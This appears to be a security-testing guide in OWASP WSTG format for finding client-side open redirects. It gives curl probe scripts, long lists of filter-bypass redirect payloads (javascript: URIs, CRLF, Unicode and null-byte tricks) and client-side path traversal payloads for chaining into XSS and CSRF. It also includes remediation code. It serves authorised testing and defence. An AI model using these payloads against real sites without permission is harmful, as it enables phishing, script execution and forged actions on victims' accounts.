---
name: wstg-clnt-04
description: "Testing for Client-Side URL Redirect"
category: client-side
owasp_id: WSTG-CLNT-04
version: "1.0.0"
author: cyberstrike-official
tags: [client-side, javascript, dom, cors, wstg, clnt]
tech_stack: []
cwe_ids: [CWE-601]
chains_with: [wstg-clnt-01, wstg-clnt-01.1]
prerequisites: [wstg-conf-01, wstg-conf-02]
severity_boost:
  wstg-clnt-01: "The redirect sink (location.href = tainted param) is itself a DOM XSS sink when a javascript: payload is accepted = open redirect escalates into full script execution against the vulnerable origin instead of just an off-site phishing bounce (Medium -> High)"
---

# wstg-clnt-04

## Test ID

WSTG-CLNT-04

## Test Name

Testing for Client-Side URL Redirect

## High-Level Description

Client-side URL redirect vulnerabilities (open redirects) occur when JavaScript redirects users based on URL parameters without validation. Attackers can craft links that redirect victims to malicious sites, facilitating phishing attacks.

---

## What to Check

- [ ] location.href assignments
- [ ] location.replace() calls
- [ ] window.open() with user input
- [ ] meta refresh with parameters
- [ ] Form action manipulation

---

## How to Test

### Step 1: Identify Redirect Parameters

```bash
#!/bin/bash
TARGET="https://target.com"

# Common redirect parameters
params=("url" "redirect" "next" "return" "returnUrl" "goto" "destination" "redir" "redirect_uri" "continue")

for param in "${params[@]}"; do
    response=$(curl -sI "$TARGET/login?$param=https://evil.com" | grep -i "location")
    if echo "$response" | grep -qi "evil.com"; then
        echo "[VULN] Open redirect via: $param"
    fi
done
```

### Step 2: Test Bypass Techniques

```bash
#!/bin/bash
TARGET="https://target.com"
PARAM="redirect"

payloads=(
    "https://evil.com"
    "//evil.com"
    "https://target.com.evil.com"
    "https://evil.com/target.com"
    "https://target.com@evil.com"
    "javascript:alert(1)"
    "//evil.com/%2f%2e%2e"
    "https:evil.com"
    "/\\evil.com"
)

for payload in "${payloads[@]}"; do
    echo "Testing: $payload"
    curl -sI "$TARGET/auth?$PARAM=$payload" | grep -i "location"
done
```

### Step 3: JavaScript Redirect Analysis

```javascript
// Search for these patterns in JS files:
// location.href =
// location.replace(
// window.location =
// window.open(

// Check if URL parameter is used without validation
const urlParams = new URLSearchParams(window.location.search)
const redirectUrl = urlParams.get("redirect")

// Vulnerable pattern:
window.location.href = redirectUrl // No validation!

// Safe pattern:
const allowedHosts = ["target.com", "sub.target.com"]
try {
  const url = new URL(redirectUrl)
  if (allowedHosts.includes(url.hostname)) {
    window.location.href = redirectUrl
  }
} catch (e) {
  // Invalid URL
}
```

---

## Tools

| Tool               | Purpose                                              |
| ------------------- | ------------------------------------------------------ |
| **Burp Suite**       | Fuzz redirect parameters and follow response chains     |
| **OpenRedireX**      | Automated open-redirect bypass scanner                  |
| **Browser DevTools** | Confirm JS-side `location`/`window.open` sinks           |

---

## Example Commands/Payloads

### Redirect parameter probe

```bash
TARGET="https://{target}"
for param in url redirect next return returnUrl goto destination redir redirect_uri continue; do
  curl -sI "$TARGET/login?$param=https://attacker.tld" | grep -qi "attacker.tld" && echo "[VULN] $param"
done
```

### Bypass payloads

```
https://attacker.tld
//attacker.tld
https://target.tld.attacker.tld
https://attacker.tld/target.tld
https://target.tld@attacker.tld
javascript:alert(document.domain)
//attacker.tld/%2f%2e%2e
https:attacker.tld
/\attacker.tld
/%09/attacker.tld
```

### JS sink confirmation

```javascript
// Paste in browser console on the redirect landing page
const p = new URLSearchParams(location.search)
console.log("redirect param value:", p.get("redirect"))
location.href = p.get("redirect") // observe if navigation is unrestricted
```

### Additional filter-bypass encodings (PayloadsAllTheThings)

```
# CRLF injection to break a "javascript" keyword blocklist
java%0d%0ascript%0d%0a:alert(document.domain)

# HTTP Parameter Pollution - some frameworks use the LAST value, filters check the FIRST
?redirect=https://target.tld&redirect=https://attacker.tld

# Unicode "ideographic full stop" (。, U+3002) normalizes to "." in some URL parsers
//attacker.tld%E3%80%82evil
/?redir=attacker。tld

# Null byte to truncate a suffix allowlist check
//attacker.tld%00.target.tld

# "?" makes the browser treat everything after the trusted host as a query string
http://target.tld?attacker.tld/
http://target.tld?folder/attacker.tld

# Folder path mimicking the trusted domain
http://target.tld/http://attacker.tld/
http://target.tld/folder/attacker.tld

# Host/split via Unicode normalization (Ⅴ, full-width slash, etc.)
https://evil.c℀.target.tld
http://target.tld／attacker.tld
```

### Client-Side Path Traversal - CSPT2XSS / CSPT2CSRF (from PayloadsAllTheThings)

A related but distinct client-side sink: instead of `location.href` being assigned an attacker URL directly, front-end JavaScript builds a `fetch()`/`XMLHttpRequest` request path by concatenating an unencoded, attacker-controlled parameter. Injecting `../` sequences into that parameter redirects the *browser-issued, cookie-bearing* request to an arbitrary endpoint — chaining into either reflected XSS or CSRF-bypass depending on the sink.

```javascript
// Look for fetch()/XHR calls that build a path from a URL parameter without encoding it
fetch(`/newsitems/${newsitemid}`)   // vulnerable if newsitemid is taken raw from location.search

// CSPT-to-XSS: redirect the fetch to a different endpoint that reflects the payload
// https://{target}/static/cms/news.html?newsitemid=../pricing/default.js?cb=alert(document.domain)//
```

```bash
# Probe candidate CSPT sinks: any client-routed id/path param, test with traversal + a sentinel
curl -s "https://{target}/static/cms/news.html?newsitemid=../../api/v4/config"
```

CSPT-to-CSRF is the higher-impact variant: because the browser (not the attacker) issues the request, it automatically attaches the victim's cookies *and* any CSRF token the front-end injects — defeating anti-CSRF tokens and `SameSite=Lax`, and working with state-changing GET/PATCH/PUT/DELETE sinks that ordinary CSRF (body-only, POST-only) cannot reach:

```text
# Real-world pattern (CVE-2023-45316, Mattermost): traversal in one param reroutes a
# telemetry/tracking fetch to a privileged API action
/<team>/channels/channelname?telem_action=x&telem_run_id=../../../../../../api/v4/caches/invalidate
```

Detection pattern: identify a page whose script performs `fetch()`/`XHR` using a URL-derived value without validating it resolves within the intended base path; confirm exploitability by injecting `../` and observing the network tab route to an unrelated endpoint while still carrying the session's cookies/auth headers. Burp's `doyensec/CSPTBurpExtension` automates discovery of these sinks.

---

## Remediation

```javascript
function safeRedirect(url) {
  const allowedHosts = ["example.com", "sub.example.com"]

  try {
    const parsed = new URL(url, window.location.origin)

    // Only allow same-origin or whitelisted hosts
    if (parsed.origin === window.location.origin || allowedHosts.includes(parsed.hostname)) {
      window.location.href = parsed.href
    } else {
      window.location.href = "/" // Default safe redirect
    }
  } catch (e) {
    window.location.href = "/"
  }
}
```

---

## Risk Assessment

| Finding                  | CVSS | Severity |
| ------------------------ | ---- | -------- |
| Open redirect            | 4.7  | Medium   |
| javascript: URI redirect | 6.1  | Medium   |

---

## CWE Categories

| CWE ID      | Title                             |
| ----------- | --------------------------------- |
| **CWE-601** | URL Redirection to Untrusted Site |


---

## References

- [OWASP WSTG - Testing for Client-side URL Redirect (WSTG-CLNT-04)](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect)
- [PayloadsAllTheThings - Open Redirect](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect)
- [OWASP Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)
- [PayloadsAllTheThings - Client Side Path Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Client%20Side%20Path%20Traversal)

---

## Checklist

```
[ ] Redirect parameters identified
[ ] Bypass techniques tested
[ ] JavaScript redirect code analyzed
[ ] javascript: URI tested
[ ] Findings documented
```
